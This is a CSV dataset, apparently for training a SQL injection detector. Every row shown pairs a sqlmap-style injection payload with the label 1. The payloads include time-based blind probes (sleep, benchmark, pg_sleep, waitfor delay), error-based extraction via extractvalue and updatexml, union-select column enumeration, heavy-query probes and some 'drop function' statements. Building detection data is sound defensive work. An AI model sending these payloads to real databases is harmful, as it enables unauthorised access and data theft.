Data,Label
1%'    )      )       )    and    (   select * from    (   select   (   sleep   (   5    )      )       )   fzno   )    and     (      (       (   '%'   =   ',1
-1796'   )    or 4493   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4493   =   4493   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     and    (   'lpuw' like 'lpuw,1
-7246'||   (   select 'qchp' from dual where 8317   =   8317 order by 1--,1
"1' or 1022   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   --",1
"-5529"" or 5903   =      (   'qqpjq'||   (   select case 5903 when 5903 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )   ",1
"1'   )    and 3824   =   benchmark   (   5000000,md5   (   0x76555642    )      )     and    (   'mhvy' like 'mhvy",1
"1'   )    and 6055   =   ctxsys.drithsx.sn   (   6055,   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   6055   =   6055   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )       )   ",1
1    )      )     as gocb where 4335   =   4335,1
"1%'   )    and 8635   =      (   select count   (   *   )    from generate_series   (   1,5000000    )      )    --",1
"1""    )      )     or elt   (   5873   =   5873,sleep   (   5    )      )    #",1
"select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (   'yvbb'   =   'yvbb",1
"1"" and 7533   =   7533",1
"1   )    union all select null,null,null,null,null,null,null,null#",1
"1'    )      )       )      (   select    (   case when    (   4587   =   4587   )    then regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    else char   (   76   )   ||char   (   65   )   ||char   (   102   )   ||char   (   72   )    end   )    from    (   values   (   0    )      )       )    and     (      (       (   'weof'   =   'weof",1
1'+   (   select 'uetb' where 6468   =   6468,1
"1'+   (   select lhho where 7579   =   7579 and char   (   109   )   ||char   (   79   )   ||char   (   70   )   ||char   (   90   )      =   regexp_substring   (   repeat   (   right   (   char   (   5012   )   ,0   )   ,5000000000   )   ,null   )   --",1
"1 where 1886   =   1886 union all select null,null,null,null,null,null,null,null,null--",1
"-1844"" where 7948   =   7948 or 1570   =   convert   (   int,   (   select char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   1570   =   1570   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )   --",1
"1""    )      )     and 8148   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
"select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and     (      (    'btnl'   =   'btnl",1
"1'||   (   select 'tdcr' where 6792   =   6792 union all select null,null,null,null,null#",1
"1""   )    where 6859   =   6859 union all select null,null,null,null,null,null,null,null#",1
"-9098'||   (   select 'xodn' from dual where 8202   =   8202 union all select 8202,8202,8202,8202,8202,8202,8202--",1
"select * from generate_series   (   2382,2382,case when    (   2382   =   4352   )    then 1 else 0 end   )    limit 1--",1
"1"" or 8315   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )   ",1
select sleep   (   5   )    and     (      (       (   'thqr' like 'thqr,1
"1 and 3824   =   benchmark   (   5000000,md5   (   0x76555642    )      )    ",1
"1    )      )       )    union all select null,null,null,null--",1
"-9565"" where 1616   =   1616 union all select 1616,1616,1616,1616--",1
"1""   )    union all select null,null,null,null,null,null,null--",1
"1%"" and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    and ""%""   =   """,1
"1"" and    (   select * from    (   select   (   sleep   (   5    )      )       )   fzno   )    and ""gddl"" like ""gddl",1
"1%' and 8148   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
"1   )    as fgqe where 1526   =   1526 and    (   select 2*   (   if    (      (    select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   3484   =   3484,1    )      )       )   ,0x717a767a71,0x78    )      )    s   )   , 8446744073709551610, 8446744073709551610    )      )       )   --",1
"1'    )      )       )    and 3824   =   benchmark   (   5000000,md5   (   0x76555642    )      )     and     (      (       (   'wesl'   =   'wesl",1
"1'    )      )       )    or 7552   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    and     (      (       (   'bfrq' like 'bfrq",1
-6802   )    as coyv where 5693   =   5693 or 8571   =   8571--,1
"-3817""   )    as vugz where 3064   =   3064 or 9323   =   9323#",1
  (   select * from    (   select   (   sleep   (   5    )      )       )   srmq   )   -- mmjk,1
"select like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    ",1
"1%""   )    and 2388   =   benchmark   (   5000000,md5   (   0x6d457153    )      )    #",1
"1""   )    and sleep   (   5   )    and    (   ""fsuf"" like ""fsuf",1
"1""    )      )       (   select    (   case when    (   4587   =   4587   )    then regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    else char   (   76   )   ||char   (   65   )   ||char   (   102   )   ||char   (   72   )    end   )    from    (   values   (   0    )      )       )    and     (      (    ""prhp""   =   ""prhp",1
"1 where 9279   =   9279 or 7427   =   dbms_pipe.receive_message   (   chr   (   116   )   ||chr   (   87   )   ||chr   (   90   )   ||chr   (   109   )   ,5   )   --",1
1%'    )      )     and 3721   =   2597#,1
"select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and     (      (       (   ""woun"" like ""woun",1
"1""    )      )     as yfpl where 4820   =   4820 union all select null,null,null,null,null,null,null--",1
1' and 6969   =      (   select 6969 from pg_sleep   (   5    )      )  ,1
-9581   )    as jkqo where 5200   =   5200 or 6872   =   6872--,1
  (   select * from    (   select   (   sleep   (   5    )      )       )   srmq   )    and     (      (       (   3124   =   3124,1
"1""    )      )     as wfne where 8933   =   8933",1
-7633'   )    as aslj where 2317   =   2317 or 8571   =   8571--,1
"1   )    as ezje where 5234   =   5234 and make_set   (   8403   =   8403,8899   )   --",1
"1'    )      )     or extractvalue   (   1297,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   1297   =   1297,1    )      )       )   ,0x717a767a71    )      )     and     (      (    'wgpg' like 'wgpg",1
1'   )    and    (   2763   =   4004   )   *4004 and    (   'dtts'   =   'dtts,1
"1""   )    as nyui where 2511   =   2511",1
"1'   )    procedure analyse   (   extractvalue   (   9255,concat   (   0x5c,   (   benchmark   (   5000000,md5   (   0x52515a50    )      )        )      )       )   ,1   )    and    (   'qdhz'   =   'qdhz",1
"1'+   (   select 'arqt' where 2336   =   2336 or char   (   75   )   ||char   (   70   )   ||char   (   99   )   ||char   (   83   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )   --",1
"-1401""    )      )     union all select 3480,3480,3480,3480,3480,3480--",1
end and     (      (       (   'ycte'   =   'ycte,1
"1""    )      )     or row   (   1045,7562   )   >   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   1045   =   1045,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from    (   select 8488 union select 5584 union select 3051 union select 1210   )   a group by x   )    and     (      (    ""cyyh""   =   ""cyyh",1
" select sleep   (   5   )    and     (      (       (   ""uvzc"" like ""uvzc",1
-8010' or    (   2225   =   8491   )   *8491 and 'eipf'   =   'eipf,1
"1"" and 6537   =   dbms_pipe.receive_message   (   chr   (   76   )   ||chr   (   116   )   ||chr   (   117   )   ||chr   (   65   )   ,5   )    and ""icow"" like ""icow",1
select    (   case when    (   5847   =   2826   )    then 5847 else cast   (   1 as int   )   /   (   select 0 from dual   )    end   )    from dual--,1
"1'    )      )       )    and 6510   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    and     (      (       (   'ibav'   =   'ibav",1
"1' or 8156   =      (   select count   (   *   )    from generate_series   (   1,5000000    )      )    --",1
"-9758'+   (   select 'rlcy' where 3691   =   3691 union all select 3691,3691,3691,3691,3691,3691,3691--",1
"-4473'   )    union all select 7656,7656#",1
-8922 or 5903   =      (   'qqpjq'||   (   select case 5903 when 5903 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )   -- krmh,1
"1'   )    or 8315   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )    and    (   'amjh'   =   'amjh",1
"1'   )    where 6774   =   6774 or 5286   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   --",1
"1""   )    where 6255   =   6255 and extractvalue   (   7982,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   7982   =   7982,1    )      )       )   ,0x717a767a71    )      )    --",1
"select benchmark   (   5000000,md5   (   0x4c4d6142    )      )     and     (      (    'xcxr' like 'xcxr",1
"1'+   (   select 'yfrs' where 4388   =   4388 and 9254   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   --",1
-9522   )    as lraw where 9472   =   9472 or    (   4087   =   8213   )   *8213--,1
"1%"" or 6979   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
"1""   )    where 5828   =   5828 or 8384   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )    --",1
select sleep   (   5   )    and 'hhrw' like 'hhrw,1
1    )      )     as nwyh where 7100   =   7100,1
"-1339    )      )       )    union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",1
1'+   (   select 'dhcv' where 9372   =   9372,1
-8453    )      )       )    or 3038   =   3038,1
1'   )    where 8274   =   8274,1
"1""   )    or    (   select 9173 from   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   9173   =   9173,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from information_schema.character_sets group by x   )   a   )    and    (   ""rwlq""   =   ""rwlq",1
"1""    )      )     or elt   (   6272   =   6272,sleep   (   5    )      )     and     (      (    ""tvla""   =   ""tvla",1
"-3116    )      )     as jyiq where 3875   =   3875 union all select 3875,3875,3875,3875,3875,3875,3875,3875#",1
"1' where 4701   =   4701 and row   (   6237,7469   )   >   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   6237   =   6237,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from    (   select 5192 union select 3785 union select 3931 union select 7158   )   a group by x   )   --",1
"1""    )      )     as etap where 8506   =   8506 union all select null,null,null,null#",1
"1   )    or row   (   1045,7562   )   >   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   1045   =   1045,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from    (   select 8488 union select 5584 union select 3051 union select 1210   )   a group by x   )    and    (   3872   =   3872",1
"1""   )    and 4241   =   convert   (   int,   (   select char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   4241   =   4241   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )    and    (   ""hbfr"" like ""hbfr",1
"1' or    (   select 9173 from   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   9173   =   9173,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from information_schema.character_sets group by x   )   a   )    and 'wwwb'   =   'wwwb",1
"1'   )    or char   (   117   )   ||char   (   111   )   ||char   (   105   )   ||char   (   100   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and    (   'maln' like 'maln",1
"1%""   )    and elt   (   4249   =   4249,7259   )    and    (   ""%""   =   """,1
1   )    and 4386   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4386   =   4386   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     and    (   6518   =   6518,1
"1""   )    where 1705   =   1705",1
1' in boolean mode   )    rlike    (   select * from    (   select   (   sleep   (   5    )      )       )   vwyq   )   #,1
"1""    )      )     as dvpb where 6673   =   6673",1
"select benchmark   (   5000000,md5   (   0x4c4d6142    )      )    # idxq",1
1   )    union all select null#,1
"1%""   )    and sleep   (   5   )   #",1
"1"" where 5977   =   5977",1
"-4340    )      )     or make_set   (   9354   =   9354,7185   )    and     (      (    8505   =   8505",1
1'+   (   select 'drqj' where 1246   =   1246,1
1%'    )      )       )    and 7756   =   dbms_utility.sqlid_to_sqlhash    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   7756   =   7756   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )       )    and     (      (       (   '%'   =   ',1
"1""    )      )     as uqem where 3521   =   3521",1
"1' and elt   (   1210   =   1210,sleep   (   5    )      )     and 'pjrf'   =   'pjrf",1
1'   )    and 5999   =   5879,1
"-9601'    )      )     or 1 group by concat   (   0x7171706a71,   (   select    (   case when    (   4232   =   4232   )    then 1 else 0 end    )      )    ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )     having min   (   0   )   #",1
-2793'   )    where 2621   =   2621 union all select 2621#,1
select case when 1802   =   7063 then 1 else null end--,1
"-6680%""    )      )     union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",1
"1    (   select    (   case when    (   5451   =   5451   )    then regexp_substring   (   repeat   (   right   (   char   (   5451   )   ,0   )   ,500000000   )   ,null   )    else char   (   108   )   ||char   (   76   )   ||char   (   112   )   ||char   (   116   )    end   )    from information_schema.system_users   )   -- fzhj",1
1'+   (   select onzd where 8452   =   8452 and 2853   =   cast    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113    )      )    ||   (   select    (   case when    (   2853   =   2853   )    then 1 else 0 end    )      )    ::text||   (   chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     as numeric    )      )    +',1
"-9371'   )    union all select 5900,5900,5900#",1
"1"" and    (   select 9067 from   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   9067   =   9067,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from information_schema.character_sets group by x   )   a   )    and ""krtr"" like ""krtr",1
"1%'   )    and 3580   =      (   select count   (   *   )    from domain.domains as t1,domain.columns as t2,domain.tables as t3   )   --",1
1'    )      )       )    or 6793   =      (   select 6793 from pg_sleep   (   5    )      )     and     (      (       (   'ugrk'   =   'ugrk,1
"call regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and 'nhuk'   =   'nhuk",1
"1,   (   select    (   case when    (   5885   =   1825   )    then 1 else 5885*   (   select 5885 from master..sysdatabases   )    end    )      )    ",1
"1   )    as lhie where 4631   =   4631 union all select null,null,null,null,null--",1
"1""   )    where 8588   =   8588",1
"1' and 6414   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   ",1
1   )    where 6304   =   6304,1
"-6924'   )    union all select 2046,2046,2046,2046,2046,2046,2046--",1
"-2901"" or elt   (   9866   =   9099,9099   )    and ""asib"" like ""asib",1
-6500'    )      )     or    (   8459   =   8459   )   *4906 and     (      (    'padu' like 'padu,1
"1'    )      )     and char   (   120   )   ||char   (   106   )   ||char   (   117   )   ||char   (   85   )      =   regexp_substring   (   repeat   (   right   (   char   (   9981   )   ,0   )   ,5000000000   )   ,null   )    and     (      (    'wcmt'   =   'wcmt",1
"1   )    as qzif where 7877   =   7877 union all select null,null,null,null,null,null,null--",1
"1%'   )    and 2388   =   benchmark   (   5000000,md5   (   0x6d457153    )      )    #",1
1'   )    or 6793   =      (   select 6793 from pg_sleep   (   5    )      )  ,1
select    (   case when    (   2830   =   7046   )    then 2830 else cast   (   1 as int   )   /   (   select 0 from dual   )    end   )    from dual--,1
"1'+   (   select 'ixza' where 4374   =   4374 union all select null,null,null--",1
"1'    )      )       )    procedure analyse   (   extractvalue   (   9255,concat   (   0x5c,   (   benchmark   (   5000000,md5   (   0x52515a50    )      )        )      )       )   ,1   )    and     (      (       (   'dzzx'   =   'dzzx",1
"1   )    union all select null,null,null,null,null,null,null,null--",1
-3677'    )      )     or 1939   =   4484,1
"1'    )      )     and 3202   =   like   (   'abcdefg',upper   (   hex   (   randomblob   (   500000000/2    )      )        )      )     and     (      (    'nbsr' like 'nbsr",1
"-7323%"" or 4144   =      (   select upper   (   xmltype   (   chr   (   60   )   ||chr   (   58   )   ||chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4144   =   4144   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113   )   ||chr   (   62    )      )       )    from dual   )    and ""%""   =   """,1
"1%'    )      )       )    union all select null,null,null,null,null--",1
"1' and 6055   =   ctxsys.drithsx.sn   (   6055,   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   6055   =   6055   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )       )    and 'cxor'   =   'cxor",1
"1 and 5556   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   # zwck",1
"1%'    )      )       )    or    (   select 9173 from   (   select count   (   *   )   ,concat   (   0x7171706a71,   (   select    (   elt   (   9173   =   9173,1    )      )       )   ,0x717a767a71,floor   (   rand   (   0   )   *2    )      )    x from information_schema.character_sets group by x   )   a   )    and     (      (       (   '%'   =   '",1
"select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and     (      (       (   '%'   =   '",1
-9393' where 3119   =   3119 or 8571   =   8571--,1
"1'+   (   select 'ixvd' where 4772   =   4772 and char   (   111   )   ||char   (   77   )   ||char   (   121   )   ||char   (   88   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null    )      )    +'",1
"-8506'    )      )       )    union all select 1950,1950,1950,1950,1950,1950--",1
1 and sleep   (   5   )   #,1
1'+   (   select yjtm where 3965   =   3965 and 9389   =   3443,1
"-3505""   )    or 5290   =   3436--",1
"1'   )    procedure analyse   (   extractvalue   (   9255,concat   (   0x5c,   (   benchmark   (   5000000,md5   (   0x52515a50    )      )        )      )       )   ,1   )    and    (   'knhm'   =   'knhm",1
"1' where 4245   =   4245 union all select null,null--",1
1    )      )     as rbcf where 1053   =   1053,1
"1""    )      )     as gbxx where 2459   =   2459 waitfor delay '0:0:5'--",1
"select pg_sleep   (   5   )    and     (      (    ""qani""   =   ""qani",1
"select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and     (      (    ""soyg""   =   ""soyg",1
-5113'    )      )       )    or 7200   =   3094--,1
"1""   )    as zuzm where 1211   =   1211 and elt   (   5458   =   2966,2966   )   --",1
1'||   (   select 'pcps' from dual where 7255   =   7255 and 7121   =   4603,1
1   )    where 6116   =   6116 and 4386   =   utl_inaddr.get_host_address   (   chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4386   =   4386   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )    --,1
"1%""    )      )       )    union all select null,null,null,null,null,null,null,null,null,null#",1
1'   )    where 3187   =   3187 order by 1#,1
"1%'    )      )       )    and 6510   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    and     (      (       (   '%'   =   '",1
"-5757%""   )    or 6872   =   6872 and    (   ""%""   =   """,1
"1"" or sleep   (   5   )    and ""fbuo"" like ""fbuo",1
"1'    )      )     as kfnt where 8090   =   8090 procedure analyse   (   extractvalue   (   9255,concat   (   0x5c,   (   benchmark   (   5000000,md5   (   0x52515a50    )      )        )      )       )   ,1   )   --",1
-2992'    )      )     or 3440   =   cast    (      (    chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113    )      )    ||   (   select    (   case when    (   3440   =   3440   )    then 1 else 0 end    )      )    ::text||   (   chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113    )      )     as numeric   )    and     (      (    'tjgt'   =   'tjgt,1
"-3219""   )    order by 1--",1
"1""    )      )       )    or sleep   (   5   )   #",1
"1"" rlike    (   select * from    (   select   (   sleep   (   5    )      )       )   vwyq   )   #",1
"   (   select    (   case when    (   1343   =   1343   )    then    (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    else 1343 end   )    from dual   )   ",1
-6190'   )    where 2621   =   2621 or 4144   =      (   select upper   (   xmltype   (   chr   (   60   )   ||chr   (   58   )   ||chr   (   113   )   ||chr   (   113   )   ||chr   (   112   )   ||chr   (   106   )   ||chr   (   113   )   ||   (   select    (   case when    (   4144   =   4144   )    then 1 else 0 end   )    from dual   )   ||chr   (   113   )   ||chr   (   122   )   ||chr   (   118   )   ||chr   (   122   )   ||chr   (   113   )   ||chr   (   62    )      )       )    from dual   )   --,1
"1'    )      )     as ezpq where 2976   =   2976 union all select null,null,null,null,null,null,null,null,null,null#",1
"1'||   (   select 'zqdn' where 6194   =   6194 union all select null,null,null,null--",1
"1"" procedure analyse   (   extractvalue   (   5840,concat   (   0x5c,0x7171706a71,   (   select    (   case when    (   5840   =   5840   )    then 1 else 0 end    )      )    ,0x717a767a71    )      )    ,1   )    and ""acbq"" like ""acbq",1
1'    )      )     rlike    (   select    (   case when    (   7689   =   7689   )    then 1 else 0x28 end    )      )     and     (      (    'ltki'   =   'ltki,1
"1'   )    as ezoa where 4915   =   4915 and 9660   =      (   select count   (   *   )    from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )   --",1
-8878' in boolean mode   )    union all select 7785#,1
1'    )      )     and    (   7517   =   3423   )   *3423 and     (      (    'aenz'   =   'aenz,1
-2797'    )      )       )    union all select 5711#,1
"1   )    or    (   select 2*   (   if    (      (    select * from    (   select concat   (   0x7171706a71,   (   select    (   elt   (   8113   =   8113,1    )      )       )   ,0x717a767a71,0x78    )      )    s   )   , 8446744073709551610, 8446744073709551610    )      )       )    and    (   2303   =   2303",1
1'   )    and    (   3020   =   3020   )   *6703 and    (   'botl' like 'botl,1
"iif   (   9875   =   8961,1,1/0   )   ",1
"-7843' where 5986   =   5986 or make_set   (   9354   =   9354,7185   )   --",1
"1"" where 3221   =   3221 or updatexml   (   1808,concat   (   0x2e,0x7171706a71,   (   select    (   elt   (   1808   =   1808,1    )      )       )   ,0x717a767a71   )   ,8666   )   --",1
-7466 where 5161   =   5161 or 3038   =   3038,1
"1%""    )      )       )    and extractvalue   (   7982,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   7982   =   7982,1    )      )       )   ,0x717a767a71    )      )     and     (      (       (   ""%""   =   """,1
"-4477'    )      )     union all select 8444,8444,8444,8444,8444,8444,8444,8444--",1
"1%' and extractvalue   (   7982,concat   (   0x5c,0x7171706a71,   (   select    (   elt   (   7982   =   7982,1    )      )       )   ,0x717a767a71    )      )     and '%'   =   '",1
1' and 3715 in     (      (    char   (   113   )   +char   (   113   )   +char   (   112   )   +char   (   106   )   +char   (   113   )   +   (   select    (   case when    (   3715   =   3715   )    then char   (   49   )    else char   (   48   )    end    )      )    +char   (   113   )   +char   (   122   )   +char   (   118   )   +char   (   122   )   +char   (   113    )      )       )  ,1
"1"" or 4411   =      (   select count   (   *   )    from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )   ",1
"-8999"" where 2821   =   2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1
"1   )    and char   (   120   )   ||char   (   106   )   ||char   (   117   )   ||char   (   85   )      =   regexp_substring   (   repeat   (   right   (   char   (   9981   )   ,0   )   ,5000000000   )   ,null   )    and    (   3039   =   3039",1
"1""    )      )       )    rlike sleep   (   5   )   #",1
"1' in boolean mode   )    and char   (   120   )   ||char   (   106   )   ||char   (   117   )   ||char   (   85   )      =   regexp_substring   (   repeat   (   right   (   char   (   9981   )   ,0   )   ,5000000000   )   ,null   )   #",1
"1"" where 8672   =   8672 union all select null,null#",1
if   (   4907   =   9581   )    select 4907 else drop function apqw--,1
"1' where 9222   =   9222 and 3707   =      (   select count   (   *   )    from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3   )   --",1
1   )    as itvm where 1482   =   1482,1
-6912' in boolean mode   )    union all select 6012--,1
"-6334'   )    union all select 3738,3738,3738,3738,3738,3738,3738,3738--",1
"1'+   (   select pepf where 5071   =   5071 or 2367   =      (   select count   (   *   )    from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )   --",1
"1""   )    as lipa where 3450   =   3450 and make_set   (   8403   =   8403,8899   )   --",1
"1'   )    where 6081   =   6081 union all select null,null,null,null,null,null,null,null,null--",1
waitfor delay '0:0:5' and     (      (    'uvlf'   =   'uvlf,1
"call regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and     (      (    ""%""   =   """,1
"1""   )    where 2367   =   2367",1
-6616   )    order by 1--,1
"1""   )    or char   (   117   )   ||char   (   111   )   ||char   (   105   )   ||char   (   100   )      =   regexp_substring   (   repeat   (   left   (   crypt_key   (   char   (   65   )   ||char   (   69   )   ||char   (   83   )   ,null   )   ,0   )   ,500000000   )   ,null   )    and    (   ""kzcd""   =   ""kzcd",1
-4137    )      )     as elxu where 5672   =   5672 order by 1--,1
if   (   8812   =   7896   )    select 8812 else drop function xltk--,1
-3559'   )    or 5903   =      (   'qqpjq'||   (   select case 5903 when 5903 then 1 else 0 end from rdb$database   )   ||'qzvzq'   )  ,1
-7707'    )      )     union all select 3172#,1
"-5082    )      )     union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1
1'   )    rlike    (   select    (   case when    (   2721   =   8716   )    then 1 else 0x28 end    )      )     and    (   'dumt'   =   'dumt,1
